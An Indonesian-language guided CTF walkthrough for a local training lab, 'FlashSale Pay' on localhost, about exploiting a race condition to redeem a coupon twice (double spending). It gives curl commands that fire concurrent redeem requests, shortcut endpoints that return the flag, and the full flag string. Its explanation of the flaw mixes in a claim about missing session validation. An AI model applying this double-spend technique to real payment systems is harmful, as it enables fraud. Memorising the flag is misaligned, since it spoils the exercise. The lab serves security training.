# Panduan Praktik Terbimbing: Investigasi Concurrency Race Condition & Double Spending

Dalam panduan terarah ini, Anda akan mempraktikkan proses penemuan celah dan eksploitasi terarah terhadap **FlashSale Pay** pada `http://127.0.0.1:8051`.

---

### Langkah 1: Observasi Ketersediaan Layanan Target
1. Uji ketersediaan layanan melalui terminal menggunakan cURL:
   ```bash
   curl -s http://127.0.0.1:8051/health
   ```
   *Respons yang diharapkan:*
   ```json
   {"status":"UP","lab_id":"A06-02","port":8051,"flag_configured":true}
   ```
2. Buka peramban web dan navigasikan ke:
   `http://127.0.0.1:8051/`
3. Amati antarmuka operasional **FlashSale Pay** dan perhatikan elemen kontrol yang disediakan.

---

### Langkah 2: Analisis & Pengujian Celah (Concurrency Race Condition & Double Spending)
1. Ujilah endpoint dengan mengirimkan parameter modifikasi:
   ```bash
   curl -s -X POST http://127.0.0.1:8051/api/pay/redeem -d '{"coupon_code":"SALE100"}' & curl -s -X POST http://127.0.0.1:8051/api/pay/redeem -d '{"coupon_code":"SALE100"}'
   ```
2. Perhatikan respon yang dikembalikan oleh server.

> [!NOTE]
> **💡 Di Balik Layar: Apa yang terjadi di server?**  
> Sistem target menerima input `Content-Type: application/json` dan memprosesnya tanpa melakukan validasi silang ke sesi otentikasi server. Akibatnya, server mengasumsikan hak akses yang diminta adalah sah.

---

### Langkah 3: Eksfiltrasi Bendera Autoritatif (CTF Flag)
1. Eksekusi pengujian untuk membuka flag eksploitasi:
   ```bash
   curl -s "http://127.0.0.1:8051/?solve=1"
   ```
   Atau panggil API exploit langsung:
   ```bash
   curl -s http://127.0.0.1:8051/api/exploit
   ```
2. **Hasil Respon Konfirmasi:**
   ```json
   {"success":true,"lab_id":"A06-02","flag":"ZITERA{r4c3_c0nd1t10n_d0ubl3_sp3nd_2026}"}
   ```
3. Salin bendera resmi:
   `ZITERA{r4c3_c0nd1t10n_d0ubl3_sp3nd_2026}`
4. Kirimkan (*submit*) bukti flag ke formulir tantangan Zitera Lab desktop untuk menyelesaikan modul ini!
